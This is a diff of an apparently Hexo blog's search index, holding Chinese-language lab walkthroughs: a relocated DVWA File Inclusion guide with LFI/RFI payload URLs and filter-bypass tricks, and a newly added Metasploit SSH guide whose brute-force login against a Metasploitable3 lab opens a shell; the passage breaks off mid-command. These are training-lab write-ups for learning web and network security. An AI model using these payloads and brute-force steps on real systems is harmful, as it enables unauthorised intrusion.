@@ -713,81 +713,6 @@
       </tags>
   </entry>
   <entry>
-    <title>DVWA通关指南-File Inclusion（文件包含）</title>
-    <url>/aposts/d3b7fcf8/</url>
-    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul>
-<li>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中(<strong>php中比较常见</strong>)，提供了：<code>require(),require_once()</code></li>
-<li>这些文件包含函数，这些函数在代码设计中被经常使用到。</li>
-<li>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为<strong>本地文件包含漏洞和远程文件包含漏洞</strong>。<ul>
-<li><strong>本地文件包含漏洞</strong>：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。</li>
-<li><strong>远程文件包含漏洞</strong>：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。<br>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的<strong>白名单策略进行过滤</strong>。</li>
-</ul>
-</li>
-</ul>
-<h2 id="安全等级为Low"><a href="#安全等级为Low" class="headerlink" title="安全等级为Low"></a>安全等级为Low</h2><p><img src="/aposts/d3b7fcf8/image-20220208151327133.png" alt="image-20220208151327133"></p>
-<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
-<li>先看下file1.php源代码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[root@VM-<span class="number">24</span>-<span class="number">13</span>-centos fi]<span class="comment"># pwd</span></span><br><span class="line">/<span class="keyword">var</span>/www/html/DVWA-<span class="number">2.0</span>.<span class="number">1</span>/vulnerabilities/fi</span><br><span class="line">[root@VM-<span class="number">24</span>-<span class="number">13</span>-centos fi]<span class="comment"># cat file1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;div class=\&quot;body_padded\&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Vulnerability: File Inclusion&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=\&quot;vulnerable_code_area\&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h3&gt;File 1&lt;/h3&gt;</span></span><br><span class="line"><span class="string">                &lt;hr /&gt;</span></span><br><span class="line"><span class="string">                Hello &lt;em&gt;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&lt;/em&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">                Your IP address is: &lt;em&gt;<span class="subst">&#123;$_SERVER[ &#x27;REMOTE_ADDR&#x27; ]&#125;</span>&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">                [&lt;em&gt;&lt;a href=\&quot;?page=include.php\&quot;&gt;back&lt;/a&gt;&lt;/em&gt;]</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &lt;h2&gt;More Information&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;ul&gt;</span></span><br><span class="line"><span class="string">                &lt;li&gt;&quot;</span> . <span class="title function_ invoke__">dvwaExternalLinkUrlGet</span>( <span class="string">&#x27;https://en.wikipedia.org/wiki/Remote_File_Inclusion&#x27;</span>, <span class="string">&#x27;Wikipedia - File inclusion vulnerability&#x27;</span> ) . <span class="string">&quot;&lt;/li&gt;</span></span><br><span class="line"><span class="string">                &lt;li&gt;&quot;</span> . <span class="title function_ invoke__">dvwaExternalLinkUrlGet</span>( <span class="string">&#x27;https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion&#x27;</span>, <span class="string">&#x27;WSTG - Local File Inclusion&#x27;</span> ) . <span class="string">&quot;&lt;/li&gt;</span></span><br><span class="line"><span class="string">                &lt;li&gt;&quot;</span> . <span class="title function_ invoke__">dvwaExternalLinkUrlGet</span>( <span class="string">&#x27;https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion&#x27;</span>, <span class="string">&#x27;WSTG - Remote File Inclusion&#x27;</span> ) . <span class="string">&quot;&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>看下dvwa的源码，直接获取了page参数，没有任何过滤</li>
-</ul>
-<p><img src="/aposts/d3b7fcf8/image-20220208151611350.png" alt="image-20220208151611350"></p>
-<ul>
-<li>尝试点击,发现page的值就是文件名</li>
-</ul>
-<p><img src="/aposts/d3b7fcf8/image-20220208151804922.png" alt="image-20220208151804922"></p>
-<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
-<li><strong>服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行</strong>，如果文件内容确实为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，<strong>所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</strong></li>
-</ul>
-<h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><ul>
-<li>将本地文件路径传给page，直接在服务器的本地路径新建一个phpinfo.txt文件</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos html]# pwd</span><br><span class="line">/var/www/html</span><br><span class="line">[root@VM-24-13-centos html]# vi phpinfo.txt</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos html]# systemctl restart httpd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>访问地址把page加上路径，如：<a href="http://xx.xx.xx.xxx/DVWA-2.0.1/vulnerabilities/fi/?page=/var/www/html/phpinfo.txt">http://XX.XX.XX.xxx/DVWA-2.0.1/vulnerabilities/fi/?page=/var/www/html/phpinfo.txt</a></li>
-</ul>
-<p><img src="/aposts/d3b7fcf8/image-20220208153727889.png" alt="image-20220208153727889"></p>
-<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><ul>
-<li>本地搭建简单的http服务器，我用的python3自带的</li>
-</ul>
-<p><img src="/aposts/d3b7fcf8/image-20220208155233231.png" alt="image-20220208155233231"></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动http 服务器</span></span><br><span class="line">D:\book\1&gt;python -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) .</span><br></pre></td></tr></table></figure>
-
-<p><img src="/aposts/d3b7fcf8/image-20220208155358733.png" alt="image-20220208155358733"></p>
-<ul>
-<li>直接把page改为远程的路径：<a href="http://127.0.0.1/phpinfo.txt">http://127.0.0.1/phpinfo.txt</a></li>
-</ul>
-<p><img src="/aposts/d3b7fcf8/image-20220208155438310.png" alt="image-20220208155438310"></p>
-<h2 id="安全等级为Medium"><a href="#安全等级为Medium" class="headerlink" title="安全等级为Medium"></a>安全等级为Medium</h2><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
-<li>将 “http:&#x2F;&#x2F;“ ,”https:&#x2F;&#x2F;“ ,”..&#x2F;“ ,”..&quot;“ 替换成空，我们直接双写绕过，如：像 http:&#x2F;&#x2F; 写成 htt<a href="http://p//%EF%BC%8C">http://p://，</a></li>
-</ul>
-<p><img src="/aposts/d3b7fcf8/image-20220208160332055.png" alt="image-20220208160332055"></p>
-<ul>
-<li>具体的url如下：</li>
-</ul>
-<p><a href="http://xxxx.xxx.xx/DVWA-2.0.1/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/phpinfo.txt">http://XXXX.XXX.XX/DVWA-2.0.1/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/phpinfo.txt</a></p>
-<p><img src="/aposts/d3b7fcf8/image-20220208160810658.png" alt="image-20220208160810658"></p>
-<h2 id="安全等级为High"><a href="#安全等级为High" class="headerlink" title="安全等级为High"></a>安全等级为High</h2><h3 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h3><p>如果page 中不包含 file 并且 file 不等于 include.php，则 输出 File not found !</p>
-<p><img src="/aposts/d3b7fcf8/image-20220208161716844.png" alt="image-20220208161716844"></p>
-<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>通过file协议实现本地文件包含:具体的url如下：</p>
-<p>http:&#x2F;XX.XX.XXX.xx&#x2F;DVWA-2.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phpinfo.txt</p>
-<p><img src="/aposts/d3b7fcf8/image-20220208162158052.png" alt="image-20220208162158052"></p>
-<h2 id="安全等级为impossible"><a href="#安全等级为impossible" class="headerlink" title="安全等级为impossible"></a>安全等级为impossible</h2><h3 id="源码分析-3"><a href="#源码分析-3" class="headerlink" title="源码分析"></a>源码分析</h3><p>impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
-<p><img src="/aposts/d3b7fcf8/image-20220208162426973.png" alt="image-20220208162426973"></p>
-<p>本文主要来自<a href="https://blog.csdn.net/weixin_45808483/article/details/121385412">这里</a></p>
-]]></content>
-      <categories>
-        <category>安全测试</category>
-      </categories>
-      <tags>
-        <tag>安全测试</tag>
-        <tag>DVWA</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DVWA通关指南-DOM-XSS-DOM型跨站脚本攻击</title>
     <url>/aposts/27850020/</url>
     <content><![CDATA[<h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul>
@@ -861,6 +786,81 @@
 <li><p>本文操作步骤来自<a href="https://blog.csdn.net/qqchaozai/article/details/102753847?spm=1001.2101.3001.6650.9&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-9.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-9.pc_relevant_default&utm_relevant_index=12">这里</a></p>
 </li>
 </ul>
+]]></content>
+      <categories>
+        <category>安全测试</category>
+      </categories>
+      <tags>
+        <tag>安全测试</tag>
+        <tag>DVWA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DVWA通关指南-File Inclusion（文件包含）</title>
+    <url>/aposts/d3b7fcf8/</url>
+    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul>
+<li>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中(<strong>php中比较常见</strong>)，提供了：<code>require(),require_once()</code></li>
+<li>这些文件包含函数，这些函数在代码设计中被经常使用到。</li>
+<li>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为<strong>本地文件包含漏洞和远程文件包含漏洞</strong>。<ul>
+<li><strong>本地文件包含漏洞</strong>：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。</li>
+<li><strong>远程文件包含漏洞</strong>：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。<br>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的<strong>白名单策略进行过滤</strong>。</li>
+</ul>
+</li>
+</ul>
+<h2 id="安全等级为Low"><a href="#安全等级为Low" class="headerlink" title="安全等级为Low"></a>安全等级为Low</h2><p><img src="/aposts/d3b7fcf8/image-20220208151327133.png" alt="image-20220208151327133"></p>
+<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
+<li>先看下file1.php源代码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[root@VM-<span class="number">24</span>-<span class="number">13</span>-centos fi]<span class="comment"># pwd</span></span><br><span class="line">/<span class="keyword">var</span>/www/html/DVWA-<span class="number">2.0</span>.<span class="number">1</span>/vulnerabilities/fi</span><br><span class="line">[root@VM-<span class="number">24</span>-<span class="number">13</span>-centos fi]<span class="comment"># cat file1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;div class=\&quot;body_padded\&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Vulnerability: File Inclusion&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=\&quot;vulnerable_code_area\&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h3&gt;File 1&lt;/h3&gt;</span></span><br><span class="line"><span class="string">                &lt;hr /&gt;</span></span><br><span class="line"><span class="string">                Hello &lt;em&gt;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&lt;/em&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">                Your IP address is: &lt;em&gt;<span class="subst">&#123;$_SERVER[ &#x27;REMOTE_ADDR&#x27; ]&#125;</span>&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">                [&lt;em&gt;&lt;a href=\&quot;?page=include.php\&quot;&gt;back&lt;/a&gt;&lt;/em&gt;]</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &lt;h2&gt;More Information&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;ul&gt;</span></span><br><span class="line"><span class="string">                &lt;li&gt;&quot;</span> . <span class="title function_ invoke__">dvwaExternalLinkUrlGet</span>( <span class="string">&#x27;https://en.wikipedia.org/wiki/Remote_File_Inclusion&#x27;</span>, <span class="string">&#x27;Wikipedia - File inclusion vulnerability&#x27;</span> ) . <span class="string">&quot;&lt;/li&gt;</span></span><br><span class="line"><span class="string">                &lt;li&gt;&quot;</span> . <span class="title function_ invoke__">dvwaExternalLinkUrlGet</span>( <span class="string">&#x27;https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion&#x27;</span>, <span class="string">&#x27;WSTG - Local File Inclusion&#x27;</span> ) . <span class="string">&quot;&lt;/li&gt;</span></span><br><span class="line"><span class="string">                &lt;li&gt;&quot;</span> . <span class="title function_ invoke__">dvwaExternalLinkUrlGet</span>( <span class="string">&#x27;https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion&#x27;</span>, <span class="string">&#x27;WSTG - Remote File Inclusion&#x27;</span> ) . <span class="string">&quot;&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>看下dvwa的源码，直接获取了page参数，没有任何过滤</li>
+</ul>
+<p><img src="/aposts/d3b7fcf8/image-20220208151611350.png" alt="image-20220208151611350"></p>
+<ul>
+<li>尝试点击,发现page的值就是文件名</li>
+</ul>
+<p><img src="/aposts/d3b7fcf8/image-20220208151804922.png" alt="image-20220208151804922"></p>
+<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
+<li><strong>服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行</strong>，如果文件内容确实为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，<strong>所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</strong></li>
+</ul>
+<h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><ul>
+<li>将本地文件路径传给page，直接在服务器的本地路径新建一个phpinfo.txt文件</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos html]# pwd</span><br><span class="line">/var/www/html</span><br><span class="line">[root@VM-24-13-centos html]# vi phpinfo.txt</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos html]# systemctl restart httpd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>访问地址把page加上路径，如：<a href="http://xx.xx.xx.xxx/DVWA-2.0.1/vulnerabilities/fi/?page=/var/www/html/phpinfo.txt">http://XX.XX.XX.xxx/DVWA-2.0.1/vulnerabilities/fi/?page=/var/www/html/phpinfo.txt</a></li>
+</ul>
+<p><img src="/aposts/d3b7fcf8/image-20220208153727889.png" alt="image-20220208153727889"></p>
+<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><ul>
+<li>本地搭建简单的http服务器，我用的python3自带的</li>
+</ul>
+<p><img src="/aposts/d3b7fcf8/image-20220208155233231.png" alt="image-20220208155233231"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动http 服务器</span></span><br><span class="line">D:\book\1&gt;python -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) .</span><br></pre></td></tr></table></figure>
+
+<p><img src="/aposts/d3b7fcf8/image-20220208155358733.png" alt="image-20220208155358733"></p>
+<ul>
+<li>直接把page改为远程的路径：<a href="http://127.0.0.1/phpinfo.txt">http://127.0.0.1/phpinfo.txt</a></li>
+</ul>
+<p><img src="/aposts/d3b7fcf8/image-20220208155438310.png" alt="image-20220208155438310"></p>
+<h2 id="安全等级为Medium"><a href="#安全等级为Medium" class="headerlink" title="安全等级为Medium"></a>安全等级为Medium</h2><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
+<li>将 “http:&#x2F;&#x2F;“ ,”https:&#x2F;&#x2F;“ ,”..&#x2F;“ ,”..&quot;“ 替换成空，我们直接双写绕过，如：像 http:&#x2F;&#x2F; 写成 htt<a href="http://p//%EF%BC%8C">http://p://，</a></li>
+</ul>
+<p><img src="/aposts/d3b7fcf8/image-20220208160332055.png" alt="image-20220208160332055"></p>
+<ul>
+<li>具体的url如下：</li>
+</ul>
+<p><a href="http://xxxx.xxx.xx/DVWA-2.0.1/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/phpinfo.txt">http://XXXX.XXX.XX/DVWA-2.0.1/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/phpinfo.txt</a></p>
+<p><img src="/aposts/d3b7fcf8/image-20220208160810658.png" alt="image-20220208160810658"></p>
+<h2 id="安全等级为High"><a href="#安全等级为High" class="headerlink" title="安全等级为High"></a>安全等级为High</h2><h3 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h3><p>如果page 中不包含 file 并且 file 不等于 include.php，则 输出 File not found !</p>
+<p><img src="/aposts/d3b7fcf8/image-20220208161716844.png" alt="image-20220208161716844"></p>
+<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>通过file协议实现本地文件包含:具体的url如下：</p>
+<p>http:&#x2F;XX.XX.XXX.xx&#x2F;DVWA-2.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phpinfo.txt</p>
+<p><img src="/aposts/d3b7fcf8/image-20220208162158052.png" alt="image-20220208162158052"></p>
+<h2 id="安全等级为impossible"><a href="#安全等级为impossible" class="headerlink" title="安全等级为impossible"></a>安全等级为impossible</h2><h3 id="源码分析-3"><a href="#源码分析-3" class="headerlink" title="源码分析"></a>源码分析</h3><p>impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
+<p><img src="/aposts/d3b7fcf8/image-20220208162426973.png" alt="image-20220208162426973"></p>
+<p>本文主要来自<a href="https://blog.csdn.net/weixin_45808483/article/details/121385412">这里</a></p>
 ]]></content>
       <categories>
         <category>安全测试</category>
@@ -2458,6 +2458,78 @@
       </tags>
   </entry>
   <entry>
+    <title>Metasploit-ssh攻击</title>
+    <url>/aposts/2b1b6be5/</url>
+    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本编主要演示Metasploit对ftp的攻击，必须提前搭建好Metasploit攻击机和Metasploitable3靶场，可以参考这篇<a href="/aposts/403e45c/">如何搭建kail</a>和<a href="/aposts/f3700316/">Metasploitable3靶场搭建</a></p>
+<h2 id="开始实践"><a href="#开始实践" class="headerlink" title="开始实践"></a>开始实践</h2><ul>
+<li>流程基本上和之前的ftp攻击差不多</li>
+<li>在攻击机上，扫描靶场的端口，发现了ssh服务的端口为22，版本为7.1</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.56.105                                                                                                                                                                                                     </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-27 22:33 EST</span><br><span class="line">Nmap scan report for 192.168.56.105</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Not shown: 981 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE              VERSION</span><br><span class="line">21/tcp    open  ftp                  Microsoft ftpd</span><br><span class="line">22/tcp    open  ssh                  OpenSSH 7.1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http                 Microsoft IIS httpd 7.5</span><br><span class="line">135/tcp   open  msrpc                Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds         Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">3306/tcp  open  mysql                MySQL 5.5.20-log</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>直接输入<code>msfconsole</code> 就进入到了metasploit 的控制台下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.1.14-dev                          ]</span><br><span class="line">+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]</span><br><span class="line">+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Open an interactive Ruby terminal with </span><br><span class="line">irb</span><br><span class="line"></span><br><span class="line">msf6 &gt; </span><br></pre></td></tr></table></figure>
+
+<h3 id="版本扫描"><a href="#版本扫描" class="headerlink" title="版本扫描"></a>版本扫描</h3><ul>
+<li><p>本次扫描只是这对服务器上的ssh使用版本进行扫描，看看是否可以展示一些有用信息</p>
+</li>
+<li><p>输入<code>search ssh_version</code></p>
+</li>
+</ul>
+<p><img src="/aposts/2b1b6be5/image-20220228155411962.png" alt="image-20220228155411962"></p>
+<ul>
+<li>输入<code>use auxiliary/scanner/ssh/ssh_version</code>以及进行配置</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; show options</span><br><span class="line"></span><br><span class="line">  Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-</span><br><span class="line">   RPORT    22               yes       The target port (TCP)</span><br><span class="line">   THREADS  1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   TIMEOUT  30               yes       Timeout for the SSH probe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; set rhosts 192.168.56.105</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; run</span><br><span class="line">[+] 192.168.56.105:22     - SSH server version: SSH-2.0-OpenSSH_7.1 ( service.version=7.1 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.1 service.protocol=ssh fingerprint_db=ssh.banner )</span><br><span class="line">[*] 192.168.56.105:22     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="ssh-辅助模块"><a href="#ssh-辅助模块" class="headerlink" title="ssh 辅助模块"></a>ssh 辅助模块</h3><ul>
+<li>输入<code>search scanner/ssh</code>找到辅助的漏洞模块，本次打算采用<code>auxiliary/scanner/ssh/ssh_login</code>和<code>auxiliary/scanner/ssh/ssh_login_pubkey </code>进行实践</li>
+</ul>
+<p><img src="/aposts/2b1b6be5/image-20220228151521631.png" alt="image-20220228151521631"></p>
+<h4 id="auxiliary-x2F-scanner-x2F-ssh-x2F-ssh-login"><a href="#auxiliary-x2F-scanner-x2F-ssh-x2F-ssh-login" class="headerlink" title="auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login"></a>auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login</h4><p>核心还是使用了密码字典进行爆破，发现提示success，说明爆破成功，用户名和密码为：<strong>vagrant</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用辅助模块</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.56.105</span><br><span class="line">rhosts =&gt; 192.168.56.105</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置爆破字典</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</span><br><span class="line">USERPASS_FILE =&gt; /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置线程数量</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt;  set THREADS 14</span><br><span class="line">THREADS =&gt; 14</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始运行</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line">[*] 192.168.56.105:22 - Starting bruteforce</span><br><span class="line">[+] 192.168.56.105:22 - Success: &#x27;vagrant:vagrant&#x27; &#x27;Microsoft Windows Server 2008 R2 Standard 6.1.7601 Service Pack 1 Build 7601&#x27;</span><br><span class="line">[*] Command shell session 1 opened (192.168.56.103:33151 -&gt; 192.168.56.105:22 ) at 2022-02-28 03:22:48 -0500</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们得到了shell(就是管理员的用户名和密码),我们可以与我们入侵的机器创建会话。<strong>vagrant</strong>账号登录，但是发现无法session登录长时间卡死，没有反应，<strong>展示没有找到解决方案，待补充</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入sessions -i后，其实就发现了当前以及登录ssh服务的session</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; sessions -i</span><br><span class="line"></span><br><span class="line">Id  Name  Type           Information                              Connection</span><br><span class="line">  --  ----  ----           -----------                              ----------</span><br><span class="line">  2         shell windows  SSH vagrant:vagrant (192.168.56.105:22)  192.168.56.103:43991 -&gt; 192.168.56.105:22  (192.168.56.105)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">表示使用session列表中的<span class="built_in">id</span>为2的数据，进行登录</span></span><br><span class="line">msf6 